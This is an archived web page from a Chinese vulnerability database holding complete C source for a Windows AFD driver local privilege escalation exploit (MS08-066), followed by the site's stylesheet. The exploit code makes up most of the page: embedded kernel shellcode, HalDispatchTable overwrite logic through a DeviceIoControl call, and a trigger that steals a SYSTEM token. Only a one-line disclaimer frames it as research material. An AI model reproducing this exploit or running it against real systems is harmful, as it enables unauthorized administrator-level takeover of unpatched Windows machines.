From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
Subject: 9750: Microsoft Windows AFD Exploits(ms08-066)
Date: Thu, 15 Apr 2010 14:33:02 +0800
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----=_NextPart_000_0012_01CADCA8.8DE7B6F0"
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5579

This is a multi-part message in MIME format.

------=_NextPart_000_0012_01CADCA8.8DE7B6F0
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Location: http://sebug.net/exploit/9750/

=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" =
"http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<HTML><HEAD><TITLE>9750: Microsoft Windows AFD =
Exploits(ms08-066)</TITLE>
<META charset=3Dutf-8>
<META content=3D"Microsoft Windows AFD =
Exploits(ms08-066),,=E6=9C=AC=E5=9C=B0=E6=BA=A2=E5=87=BA,sebug=E5=AE=89=E5=
=85=A8=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF=E5=BA=93"=20
name=3Ddescription><LINK=20
href=3D"http://cache.ssvdb.com/640564311/aa810382f2dcdcea.css" =
rel=3Dstylesheet><!--[if IE]><LINK=20
href=3D"http://cache.ssvdb.com/640564311/style_ie.css"=20
rel=3Dstylesheet><![endif]--><LINK href=3D"http://sebug.net/rss.xml"=20
type=3Dapplication/rss+xml rel=3Dalternate>
<META content=3D"MSHTML 6.00.6000.17023" name=3DGENERATOR></HEAD>
<BODY>
<DIV id=3Dmain><SPAN class=3Dtopb><A title=3D=E7=99=BB=E5=BD=95 =
href=3D"http://sebug.net/login/">=E7=99=BB=E5=BD=95</A>=20
</SPAN>
<DIV id=3Dheader><A =
title=3DSEBUG=E5=AE=89=E5=85=A8=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF=E5=BA=
=93,=E5=85=8D=E8=B4=B9=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF=E5=B9=B3=E5=8F=
=B0=20
href=3D"http://sebug.net/">SEBUG=E5=AE=89=E5=85=A8=E6=BC=8F=E6=B4=9E=E4=BF=
=A1=E6=81=AF=E5=BA=93</A></DIV>
<DIV id=3Dmenubar>
<UL class=3Dmenus>
  <LI><A =
title=3DSEBUG=E5=AE=89=E5=85=A8=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF=E5=BA=
=93 href=3D"http://sebug.net/">Search</A> </LI>
  <LI><A title=3D=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF =
href=3D"http://sebug.net/vuldb/">Vulndb</A> </LI>
  <LI><A title=3D=E5=8E=82=E5=95=86=E7=9B=AE=E5=BD=95 =
href=3D"http://sebug.net/appdir/">Appdir</A> </LI>
  <LI class=3Dmenu>
  <UL>
    <LI><A href=3D"http://sebug.net/exploit/9750/#">More &gt;&gt;<!--[if =
IE 7]><!--></A><!--<![endif]--><!--[if lte IE =
6]><table><tr><td><![endif]-->=20

    <UL>
      <LI><A title=3D=E5=AE=89=E5=85=A8=E6=96=87=E6=A1=A3 =
href=3D"http://sebug.net/paper/" target=3Dnw>Papers</A>=20
</LI>
      <LI><A title=3D=E8=B6=8B=E5=8A=BF=E5=88=86=E6=9E=90 =
href=3D"http://sebug.net/chart/" target=3Dnw>Chart</A> </LI>
      <LI><A title=3D"SEBUG RPC Server" href=3D"http://sebug.net/un/" =
target=3Dnw>RPC=20
      Server</A> </LI>
      <LI><A title=3D"SEBUG RSS" href=3D"http://sebug.net/rss.xml" =
target=3Dnw>SEBUG=20
      RSS</A> </LI>
      <LI><A title=3DTwitter href=3D"http://twitter.com/sebug"=20
      target=3Dnw>@Twitter</A> </LI></UL><!--[if lte IE =
6]></td></tr></table></a><![endif]--></LI></UL></LI></UL></DIV>
<DIV id=3Dcontent>
<H2 class=3Dpost-title>Microsoft Windows AFD Exploits(ms08-066)</H2>
<DIV class=3Dpost-vuln>SSV ID:<A title=3D"Microsoft Windows AFD =
Exploits(ms08-066)"=20
href=3D"http://sebug.net/exploit/9750/" target=3D_blank>9750</A></DIV>
<DIV class=3Dpost-vuln>SEBUG-Appdir:<A title=3D"Microsoft Windows"=20
href=3D"http://sebug.net/appdir/Microsoft+Windows/">Microsoft =
Windows</A></DIV>
<DIV =
class=3Dpost-vuln>=E5=8F=91=E5=B8=83=E6=97=B6=E9=97=B4:2008-10-18</DIV>
<DIV class=3Dpost-hr>=E6=B5=8B=E8=AF=95=E6=96=B9=E6=B3=95:</DIV>
<DIV class=3Dexp-content><SPAN=20
class=3Dbugexp_url>[www.sebug.net]<BR>=E6=9C=AC=E7=AB=99=E6=8F=90=E4=BE=9B=
=E7=A8=8B=E5=BA=8F(=E6=96=B9=E6=B3=95)=E5=8F=AF=E8=83=BD=E5=B8=A6=E6=9C=89=
=E6=94=BB=E5=87=BB=E6=80=A7,=E4=BB=85=E4=BE=9B=E5=AE=89=E5=85=A8=E7=A0=94=
=E7=A9=B6=E4=B8=8E=E6=95=99=E5=AD=A6=E4=B9=8B=E7=94=A8,=E9=A3=8E=E9=99=A9=
=E8=87=AA=E8=B4=9F!</SPAN><PRE>#include &lt;stdio.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;

#pragma comment(lib, "ws2_32.lib")

#define NTSTATUS        int

typedef struct _PROCESS_BASIC_INFORMATION {
        NTSTATUS ExitStatus;
        PVOID PebBaseAddress;
        ULONG AffinityMask;
        ULONG BasePriority;
        ULONG UniqueProcessId;
        ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _IMAGE_FIXUP_ENTRY {
        USHORT        Offset:12;
  USHORT        Type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

typedef enum _PROCESS_IMFORMATION_CLASS {
        ProcessBasicInformation,
        ProcessQuotaLimits,
        ProcessIoCounters,
        ProcessVmCounters,
        ProcessTimes,
        ProcessBasePriority,
        ProcessRaisePriority,
        ProcessDebugPort,
        ProcessExceptionPort,
        ProcessAccessToken,
        ProcessLdtInformation,
        ProcessLdtSize,
        ProcessDeaultHardErrorMode,
        ProcessIoPortHandlers,
        ProcessPooledUsageAndLimits,
        ProcessWorkingSetWatch,
        ProcessUserModeIOPL,
        ProcessEnableAlignmentFaultFixup,
        ProcessPriorityClass,
        ProcessWx86Information,
        ProcessHandleCount,
        ProcessAffinityMask,
        ProcessPriorityBoost,
        ProcessDeviceMap,
        ProcessSessionInformation,
        ProcessForegroundInformation,
        ProcessWow64Information
} PROCESS_INFORMATION_CLASS;

typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation,
        SystemProcessorInformation,
        SystemPerformanceInformation,
        SystemTimeOfDayInformation,
        SystemNotImplemented1,
        SystemProcessesAndThreadsInformation,
        SystemCallCounts,
        SystemConfigurationInformation,
        SystemProcessorTimes,
        SystemGlobalFlag,
        SystemNotImplemented2,
        SystemModuleInformation,
        SystemLockInformation,
        SystemNotImplemented3,
        SystemNotImplemented4,
        SystemNotImplemented5,
        SystemHandleInformation,
        SystemObjectInformation,
        SystemPagefileInformation,
        SystemInstructioEmulationCounts,
        SystemInvalidInfoClass1,
        SystemCacheInformation,
        SystemPoolTagInformation,
        SystemProcessorStatistics,
        SystemDpcInformation,
        SystemNotImplemented6,
        SystemLoadImage,
        SystemUnloadImage,
        SystemTimeAdjustment,
        SystemNotImplemented7,
        SystemNotImplemented8,
        SystemNotImplemented9,
        SystemCrashDumpInformation,
        SystemExceptionInformation,
        SystemCrashDumpStateInformation,
        SystemKernelDebuggerInformation,       =20
        SystemContextSwitchInformation,
        SystemRegisterQuotaInformation,
        SystemLoadAndCallImage,
        SystemPrioritySeparation
} SYSTEM_INFORMATION_CLASS;

typedef enum _KPROFILE_SOURCE {
        ProfileTime,
  ProfileAlignmentFixup,
  ProfileTotalIssues,
  ProfilePipelineDry,
  ProfileLoadInstructions,
  ProfilePipelineFrozen,
  ProfileBranchInstructions,
  ProfileTotalNonissues,
  ProfileDcacheMisses,
  ProfileIcacheMisses,
  ProfileCacheMisses,
  ProfileBranchMispredictions,
  ProfileStoreInstructions,
  ProfileFpInstructions,
  ProfileIntegerInstructions,
  Profile2Issue,
  Profile3Issue,
  Profile4Issue,
  ProfileSpecialInstructions,
  ProfileTotalCycles,
  ProfileIcacheIssues,
  ProfileDcacheAccesses,
  ProfileMemoryBarrierCycles,
  ProfileLoadLinkedIssues,
  ProfileMaximum
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;

typedef struct _UNICODE_STRING {
        USHORT        Length;
        USHORT        MaximumLength;
        PWSTR        Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _SECTION_BASIC_INFORMATION {
        PVOID BaseAddress;
        ULONG Attributes;
        LARGE_INTEGER Size;
}SECTION_BASIC_INFORMATION, *PSECTION_BASIC_INFORMATION;

typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG Reserved[2];
        PVOID Base;
        ULONG Size;
        ULONG Flags;
        USHORT Index;
        USHORT Unknown;
        USHORT LoadCount;
        USHORT ModuleNameOffset;
        CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS (NTAPI *ZWQUERYINTERNALPROFILE)(ULONG, PULONG);
typedef NTSTATUS (NTAPI *ZWQUERYINFORMATIONPROCESS)(HANDLE, ULONG, =
PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, =
PULONG);
typedef NTSTATUS (NTAPI *ZWALLOCATEVIRTUALMEMORY)(HANDLE, PVOID *, =
ULONG, PULONG, ULONG, ULONG);
typedef PIMAGE_NT_HEADERS (NTAPI *RTLIMAGENTHEADER)(PVOID);
typedef PVOID (NTAPI *RTLIMAGEDIRECTORYENTRYTODATA)(PVOID, ULONG, =
USHORT, PULONG);

ZWQUERYINTERNALPROFILE        ZwQueryIntervalProfile;
ZWQUERYINFORMATIONPROCESS        ZwQueryInformationProcess;
ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;
ZWALLOCATEVIRTUALMEMORY ZwAllocateVirtualMemory;
RTLIMAGENTHEADER RtlImageNtHeader;
RTLIMAGEDIRECTORYENTRYTODATA RtlImageDirectoryEntryToData;

unsigned char kfunctions[64][64] =3D=20
{
                                                        //ntoskrnl.exe
        {"ZwTerminateProcess"},
        {"PsLookupProcessByProcessId"},
        {""},
};

unsigned char shellcode[] =3D=20
                =
"\x90\x60\x9c\xe9\xc4\x00\x00\x00\x5f\x4f\x47\x66\x81\x3f\x90\xcc"
                =
"\x75\xf8\x66\x81\x7f\x02\xcc\x90\x75\xf0\x83\xc7\x04\x64\x8b\x35"
                =
"\x38\x00\x00\x00\xad\xad\x48\x81\x38\x4d\x5a\x90\x00\x75\xf7\x95"
                =
"\x8b\xf7\x6a\x02\x59\xe8\x4d\x00\x00\x00\xe2\xf9\x8b\x4e\x0c\xe8"
                =
"\x29\x00\x00\x00\x50\x8b\x4e\x08\xe8\x20\x00\x00\x00\x5a\x8b\x7e"
                =
"\x1c\x8b\x0c\x3a\x89\x0c\x38\x56\x8b\x7e\x14\x8b\x4e\x18\x8b\x76"
                =
"\x10\xf3\xa4\x5e\x33\xc0\x50\x50\xff\x16\x9d\x61\xc3\x83\xec\x04"
                =
"\x8d\x2c\x24\x55\x51\xff\x56\x04\x85\xc0\x0f\x85\x80\x8f\x00\x00"
                =
"\x8b\x45\x00\x83\xc4\x04\xc3\x51\x56\x8b\x75\x3c\x8b\x74\x2e\x78"
                =
"\x03\xf5\x56\x8b\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5\x33"
                =
"\xdb\x0f\xbe\x10\x85\xd2\x74\x08\xc1\xcb\x07\x03\xda\x40\xeb\xf1"
                =
"\x3b\x1f\x75\xe7\x5e\x8b\x5e\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e"
                =
"\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x37\xff\xff"
                "\xff\x90\x90\x90"

                =
"\x90\xcc\xcc\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x90\x90\xcc";
               =20
void ErrorQuit(pMsg)
{
        printf("%sError Code:%d\n", pMsg, GetLastError());
        ExitProcess(0);
}

ULONG ComputeHash(char *ch)
{
        ULONG ret =3D 0;

        while(*ch)
        {
                ret =3D ((ret &lt;&lt; 25) | (ret &gt;&gt; 7)) + *ch++;
        }

        return ret;
}

void GetFunction()
{
        HANDLE        hNtdll;
       =20
        hNtdll =3D LoadLibrary("ntdll.dll");
        if(hNtdll =3D=3D NULL)
                ErrorQuit("LoadLibrary failed.\n");

        ZwQueryIntervalProfile =3D =
(ZWQUERYINTERNALPROFILE)GetProcAddress(hNtdll, =
"ZwQueryIntervalProfile");
        if(ZwQueryIntervalProfile =3D=3D NULL)
                ErrorQuit("GetProcAddress failed.\n");
               =20
        ZwQueryInformationProcess =3D =
(ZWQUERYINFORMATIONPROCESS)GetProcAddress(hNtdll, =
"ZwQueryInformationProcess");
        if(ZwQueryInformationProcess =3D=3D NULL)
                ErrorQuit("GetProcAddress failed.\n");
               =20
        ZwQuerySystemInformation =3D =
(ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, =
"ZwQuerySystemInformation");
        if(ZwQuerySystemInformation =3D=3D NULL)
                ErrorQuit("GetProcessAddress failed.\n");
               =20
        ZwAllocateVirtualMemory =3D =
(ZWALLOCATEVIRTUALMEMORY)GetProcAddress(hNtdll, =
"ZwAllocateVirtualMemory");
        if(ZwAllocateVirtualMemory =3D=3D NULL)
                ErrorQuit("GetProcAddress failed.\n");

        RtlImageNtHeader =3D (RTLIMAGENTHEADER)GetProcAddress(hNtdll, =
"RtlImageNtHeader");
        if(RtlImageNtHeader =3D=3D NULL)
                ErrorQuit("GetProcAddress failed.\n");
               =20
        RtlImageDirectoryEntryToData =3D =
(RTLIMAGEDIRECTORYENTRYTODATA)GetProcAddress(hNtdll, =
"RtlImageDirectoryEntryToData");
        if(RtlImageDirectoryEntryToData =3D=3D NULL)
                ErrorQuit("GetProcAddress failed.\n");
               =20
        FreeLibrary(hNtdll);
}

ULONG GetKernelBase(char *KernelName)
{
        ULONG        i, Byte, ModuleCount, KernelBase;
        PVOID        pBuffer;
        PSYSTEM_MODULE_INFORMATION        pSystemModuleInformation;
        PCHAR        pName;
       =20
        ZwQuerySystemInformation(SystemModuleInformation, =
(PVOID)&amp;Byte, 0, &amp;Byte);
               =20
        if((pBuffer =3D malloc(Byte)) =3D=3D NULL)
                ErrorQuit("malloc failed.\n");
               =20
        if(ZwQuerySystemInformation(SystemModuleInformation, pBuffer, =
Byte, &amp;Byte))
                ErrorQuit("ZwQuerySystemInformation failed\n");
       =20
        ModuleCount =3D *(PULONG)pBuffer;
        pSystemModuleInformation =3D =
(PSYSTEM_MODULE_INFORMATION)((PUCHAR)pBuffer + sizeof(ULONG));
        for(i =3D 0; i &lt; ModuleCount; i++)
        {
                if((pName =3D =
strstr(pSystemModuleInformation-&gt;ImageName, "ntoskrnl.exe")) !=3D =
NULL)
                {
                        KernelBase =3D =
(ULONG)pSystemModuleInformation-&gt;Base;
                        printf("Kernel is %s\n", =
pSystemModuleInformation-&gt;ImageName);
                        free(pBuffer);
                        strcpy(KernelName, "ntoskrnl.exe");
                       =20
                        return KernelBase;
                }
               =20
                if((pName =3D =
strstr(pSystemModuleInformation-&gt;ImageName, "ntkrnlpa.exe")) !=3D =
NULL)
                {
                        KernelBase =3D =
(ULONG)pSystemModuleInformation-&gt;Base;
                        printf("Kernel is %s\n", =
pSystemModuleInformation-&gt;ImageName);
                        free(pBuffer);
                        strcpy(KernelName, "ntkrnlpa.exe");
                       =20
                        return KernelBase;
                }
               =20
                pSystemModuleInformation++;
        }
               =20
        free(pBuffer);
        return 0;
}

ULONG GetServiceTable(PVOID pImageBase, ULONG Address)
{
        PIMAGE_NT_HEADERS        pNtHeaders;
        PIMAGE_BASE_RELOCATION        pBaseRelocation;
        PIMAGE_FIXUP_ENTRY        pFixupEntry;
        ULONG        RelocationTableSize =3D 0;
        ULONG        Offset, i, VirtualAddress, Rva;

        Offset =3D Address - (ULONG)pImageBase;
        pNtHeaders =3D (PIMAGE_NT_HEADERS)RtlImageNtHeader(pImageBase);
        pBaseRelocation =3D =
(PIMAGE_BASE_RELOCATION)RtlImageDirectoryEntryToData(pImageBase, TRUE, =
IMAGE_DIRECTORY_ENTRY_BASERELOC, &amp;RelocationTableSize);
        if(pBaseRelocation =3D=3D NULL)
                return 0;
               =20
        do=20
        {
                pFixupEntry =3D =
(PIMAGE_FIXUP_ENTRY)((ULONG)pBaseRelocation + =
sizeof(IMAGE_BASE_RELOCATION));
      =20
                RelocationTableSize =3D (pBaseRelocation-&gt;SizeOfBlock =
- sizeof(IMAGE_BASE_RELOCATION)) &gt;&gt; 1;
                for(i =3D 0; i &lt; RelocationTableSize; i++, =
pFixupEntry++)
                {
                        if(pFixupEntry-&gt;Type =3D=3D =
IMAGE_REL_BASED_HIGHLOW)
                        {
                                VirtualAddress =3D =
pBaseRelocation-&gt;VirtualAddress + pFixupEntry-&gt;Offset;
                                Rva =3D *(PULONG)((ULONG)pImageBase + =
VirtualAddress) - (ULONG)pNtHeaders-&gt;OptionalHeader.ImageBase;
                              =20
                                if(Rva =3D=3D Offset)
                                {
                                   if (*(PUSHORT)((ULONG)pImageBase + =
VirtualAddress - 2) =3D=3D 0x05c7)
                                                return =
*(PULONG)((ULONG)pImageBase + VirtualAddress + 4) - =
pNtHeaders-&gt;OptionalHeader.ImageBase;
                                }
                        }
                }

                *(PULONG)&amp;pBaseRelocation +=3D =
pBaseRelocation-&gt;SizeOfBlock;
      =20
        } while(pBaseRelocation-&gt;VirtualAddress);

        return 0;
}

int main(int argc, char* argv[])
{
        PVOID                pDrivers[256];
        PVOID                pOldKernelInfo, pMapAddress =3D NULL;
        PULONG        pStoreBuffer, pShellcode, pFakeKernelInfo;
        PUCHAR        pRestoreBuffer, pBase, FunctionAddress;
        PROCESS_BASIC_INFORMATION pbi;
        SYSTEM_MODULE_INFORMATION        smi;
        SECTION_BASIC_INFORMATION sbi;
        KPROFILE_SOURCE        ProfileSource;
        OSVERSIONINFO        ovi;
        char                DriverName[256], KernelName[64];
        ULONG                Byte, len, i, j, k, BaseAddress, Value, =
KernelBase, buf[64];
        ULONG                HookAddress, SystemId, TokenOffset, =
Sections, Pid, FunctionNumber;
        ULONG                HDTOffset, AllocationSize;
        ULONG                Result;
        HANDLE        hKernel;
        WSADATA        wsad;
        int                sockfd;
        struct sockaddr_in saddr;
       =20

        printf("\n MS08-0xx Windows Kernel Ancillary Function Driver =
Local Privilege Escalation Vulnerability Exploit \n\n");
        printf("\t Create by SoBeIt. \n\n");
        if(argc !=3D 1)
        {
                printf(" Usage:%s\n\n", argv[0]);
                return 1;
        }
       =20
        pFakeKernelInfo =3D (PULONG)malloc(256);
       =20
        GetFunction();

        if(ZwQueryInformationProcess(GetCurrentProcess(), =
ProcessBasicInformation, (PVOID)&amp;pbi, =
sizeof(PROCESS_BASIC_INFORMATION), NULL))
                ErrorQuit("ZwQueryInformationProcess failed\n");

        KernelBase =3D GetKernelBase(KernelName);
        if(!KernelBase)
                ErrorQuit("Unable to get kernel base address.\n");
               =20
        printf("Kernel base address: %x\n", KernelBase);
       =20
        ovi.dwOSVersionInfoSize =3D sizeof(OSVERSIONINFO);
       =20
        if(!GetVersionEx(&amp;ovi))
                ErrorQuit("GetVersionEx failed.\n");
       =20
        if(ovi.dwMajorVersion !=3D 5 &amp;&amp; ovi.dwMajorVersion !=3D =
6)
                ErrorQuit("Not Windows NT family OS.\n");
               =20
        printf("Major Version:%d Minor Version:%d\n", =
ovi.dwMajorVersion, ovi.dwMinorVersion);
        switch(ovi.dwMinorVersion)
        {
                case 0:                                                =
//Windows2000
                        SystemId =3D 8;
                        TokenOffset =3D 0x12c;
                        break;
                       =20
                case 1:                                                =
//WindowsXP
                        SystemId =3D 4;
                        TokenOffset =3D 0xc8;
                        break;
                       =20
                case 2:                                                =
//Windows2003
                        SystemId =3D 4;
                        TokenOffset =3D 0xd8;
                        break;
                       =20
                default:
                        SystemId =3D 4;
                        TokenOffset =3D 0xc8;
        }
       =20
        hKernel =3D LoadLibrary(KernelName);
        if(hKernel =3D=3D NULL)
                ErrorQuit("LoadLibrary failed.\n");

        printf("Load Base:%x\n", (ULONG)hKernel);
        HDTOffset =3D (ULONG)GetProcAddress(hKernel, =
"HalDispatchTable");
        HDTOffset +=3D KernelBase - (ULONG)hKernel;
        printf("HalDispatchTable Offset:%x\n", HDTOffset);
        HookAddress =3D (ULONG)(HDTOffset + 4);
        printf("NtQueryIntervalProfile function entry address:%x\n", =
HookAddress);
       =20
        AllocationSize =3D 0x1000;
        pStoreBuffer =3D (PULONG)0x7fb0;
        if(ZwAllocateVirtualMemory((HANDLE)0xffffffff, =
&amp;pStoreBuffer, 0, &amp;AllocationSize,
                                        MEM_RESERVE | MEM_COMMIT | =
MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE))
                ErrorQuit("ZwAllocateVirtualMemory failed.\n");
       =20
        pRestoreBuffer =3D malloc(0x100);

        memset(pStoreBuffer, 0x90, AllocationSize);
               =20
        pShellcode =3D (PULONG)shellcode;
        for(k =3D 0; pShellcode[k++] !=3D 0x90cccc90; )
                                ;

        for(j =3D 0; kfunctions[j][0] !=3D '\x0'; j++)
                buf[j] =3D ComputeHash(kfunctions[j]);

        buf[j++] =3D pbi.InheritedFromUniqueProcessId;
        buf[j++] =3D SystemId;
        buf[j++] =3D (ULONG)pRestoreBuffer;
        buf[j++] =3D HookAddress;
        buf[j++] =3D 0x04;
        buf[j++] =3D TokenOffset;
       =20
        memcpy((char *)(pShellcode + k), (char *)buf, j * 4);
        memcpy((PUCHAR)0x8000, shellcode, sizeof(shellcode) - 1);

        if(WSAStartup(MAKEWORD(2, 2), &amp;wsad) !=3D 0)
                ErrorQuit("WSAStartup failed.\n");

        if((sockfd =3D socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; =
0)
                ErrorQuit("socket failed.\n");

        saddr.sin_family =3D AF_INET;
        saddr.sin_port =3D htons(0x1bd);
        saddr.sin_addr.s_addr =3D 0x100007f;       =20
       =20
        if(connect(sockfd, (struct sockaddr *)&amp;saddr, sizeof(struct =
sockaddr)))
                ErrorQuit("connect failed.\n");
       =20
        DeviceIoControl((HANDLE)sockfd, 0x1203F, NULL, 0, =
(PVOID)(HookAddress - 3), 0, &amp;Result, NULL);
       =20
        ProfileSource =3D ProfileTotalIssues;
        ZwQueryIntervalProfile(ProfileSource, &amp;Result);

        printf("Exploit finished.\n");
        return 1;
}
</PRE></DIV>
<DIV class=3Dpost-sebug>// sebug.net [2008-10-18]</DIV></DIV>
<DIV id=3Dfooter>=C2=A92006 - 2010 SEBUG Security vulnerability =
Database<BR><A=20
title=3D=E9=9A=90=E7=A7=81=E6=94=BF=E7=AD=96 =
href=3D"http://sebug.net/about/About.html#Privacy">=E9=9A=90=E7=A7=81=E6=94=
=BF=E7=AD=96</A> | <A=20
title=3D=E5=90=88=E4=BD=9C=E4=BC=99=E4=BC=B4 =
href=3D"http://sebug.net/about/cooperate.html">=E5=90=88=E4=BD=9C=E4=BC=99=
=E4=BC=B4</A> | <A title=3D=E5=85=B3=E4=BA=8E=E6=88=91=E4=BB=AC=20
href=3D"http://sebug.net/about/About.html">=E5=85=B3=E4=BA=8E=E6=88=91=E4=
=BB=AC</A></DIV></DIV><!-- analytics --><SPAN=20
style=3D"DISPLAY: none">
<SCRIPT language=3DJavaScript=20
src=3D"http://s48.cnzz.com/stat.php?id=3D355990&amp;web_id=3D355990"=20
charset=3Dgb2312></SCRIPT>
<!-- analytics --></SPAN></BODY></HTML>

------=_NextPart_000_0012_01CADCA8.8DE7B6F0
Content-Type: text/css;
	charset="gb2312"
Content-Transfer-Encoding: quoted-printable
Content-Location: http://cache.ssvdb.com/640564311/aa810382f2dcdcea.css

* {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: =
0px; PADDING-TOP: 0px
}
BODY {
	BACKGROUND: #eee; FONT: 13px Tahoma,Arial,sans-serif; COLOR: #000
}
H1 {
	FONT-SIZE: 22px
}
H2 {
	FONT-SIZE: 18px
}
H3 {
	FONT-SIZE: 14px
}
TEXTAREA {
	PADDING-RIGHT: 1px; PADDING-LEFT: 1px; FONT-SIZE: 12px; PADDING-BOTTOM: =
1px; PADDING-TOP: 2px
}
BUTTON {
	PADDING-RIGHT: 6px; PADDING-LEFT: 6px; PADDING-BOTTOM: 3px; =
PADDING-TOP: 3px
}
BLOCKQUOTE {
	PADDING-RIGHT: 0px; PADDING-LEFT: 12px; PADDING-BOTTOM: 0px; =
PADDING-TOP: 0px
}
INPUT {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 16px; PADDING-BOTTOM: =
2px; PADDING-TOP: 2px; HEIGHT: 20px
}
PRE {
	WORD-WRAP: break-word
}
DIV.pages {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; RIGHT: -20px; PADDING-BOTTOM: =
3px; PADDING-TOP: 3px; POSITION: relative; TEXT-ALIGN: right
}
DIV.pages A {
	PADDING-RIGHT: 3px; BACKGROUND-POSITION: 50% bottom; PADDING-LEFT: 3px; =
PADDING-BOTTOM: 3px; MARGIN: 0px 3px; PADDING-TOP: 3px; TEXT-DECORATION: =
none
}
FIELDSET {
	BORDER-TOP: #ccc 1px solid; MARGIN: 5px 0px; BORDER-RIGHT-STYLE: none; =
BORDER-LEFT-STYLE: none; BORDER-BOTTOM-STYLE: none
}
LEGEND {
	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; FONT-WEIGHT: 700; FONT-SIZE: =
16px; PADDING-BOTTOM: 0px; MARGIN: 0px 0px 5px; COLOR: #036; =
PADDING-TOP: 0px
}
#main {
	BORDER-RIGHT: #ddd 1px solid; BORDER-TOP: #ddd 1px solid; BACKGROUND: =
#fff; MARGIN: 0px auto; BORDER-LEFT: #ddd 1px solid; WIDTH: 950px; =
BORDER-BOTTOM: #ddd 1px solid; TEXT-ALIGN: left
}
#header {
	PADDING-RIGHT: 0px; PADDING-LEFT: 20px; PADDING-BOTTOM: 8px; =
PADDING-TOP: 15px
}
#header A {
	DISPLAY: block; BACKGROUND: url(./images/top_logo.jpg) no-repeat; =
WIDTH: 300px; TEXT-INDENT: -500px; HEIGHT: 42px
}
#title {
	DISPLAY: block; FONT-WEIGHT: 900
}
#desc {
	FONT-SIZE: 12px; MARGIN: 5px 0px 0px 3px
}
#menubar {
	FONT-SIZE: 11px; BACKGROUND: #67ace5; HEIGHT: 25px
}
#menubar UL.menus LI {
	BORDER-RIGHT: #fff 1px solid; FLOAT: left; LIST-STYLE-TYPE: none
}
#menubar UL.menus LI A {
	PADDING-RIGHT: 15px; DISPLAY: block; PADDING-LEFT: 15px; BACKGROUND: =
#67ace5; PADDING-BOTTOM: 0px; COLOR: #fff; LINE-HEIGHT: 25px; =
PADDING-TOP: 0px; TEXT-DECORATION: none
}
#menubar UL.menus LI.current_page_item A {
	FONT-WEIGHT: 700; BACKGROUND: #286ea0
}
#menubar UL.menus LI A:hover {
	BACKGROUND: #4281b7
}
#content {
	BACKGROUND: #fff; FLOAT: left; MARGIN: 5px 25px; WIDTH: 94%
}
#footer {
	CLEAR: both; PADDING-RIGHT: 0px; BORDER-TOP: #ccc 1px dashed; =
PADDING-LEFT: 0px; FONT-SIZE: 12px; PADDING-BOTTOM: 15px; COLOR: #666; =
PADDING-TOP: 15px; TEXT-ALIGN: center
}
.menu {
	FONT-SIZE: 11px; POSITION: relative
}
.menu LI {
	FLOAT: left; POSITION: relative
}
.menu UL UL {
	VISIBILITY: hidden; POSITION: absolute; TOP: auto
}
.menu TABLE {
	POSITION: absolute; TOP: auto
}
.menu UL LI:hover UL {
	VISIBILITY: visible
}
.menu UL A:hover UL {
	VISIBILITY: visible
}
.menu A {
	DISPLAY: block; MARGIN-RIGHT: -1px; TEXT-ALIGN: left
}
.menu UL UL LI {
	CLEAR: both; TEXT-ALIGN: left
}
.menu UL UL LI A {
	DISPLAY: block; WIDTH: 70px; BORDER-BOTTOM: #fff 1px solid
}
.fixed {
	CLEAR: both
}
.clear {
	CLEAR: both
}
.post-title {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 700; MARGIN-BOTTOM: =
5px; PADDING-BOTTOM: 12px; PADDING-TOP: 12px; BORDER-BOTTOM: #ccc 1px =
solid
}
.post-vuln {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 700; =
PADDING-BOTTOM: 3px; PADDING-TOP: 3px
}
.post-sebug {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 5px; =
PADDING-TOP: 5px
}
.post-content {
	PADDING-RIGHT: 0px; PADDING-LEFT: 12px; PADDING-BOTTOM: 5px; =
PADDING-TOP: 5px
}
.post-hr {
	PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: 700; =
PADDING-BOTTOM: 4px; MARGIN: 8px 0px; BORDER-LEFT: #67ace5 5px solid; =
PADDING-TOP: 4px
}
.exp-content {
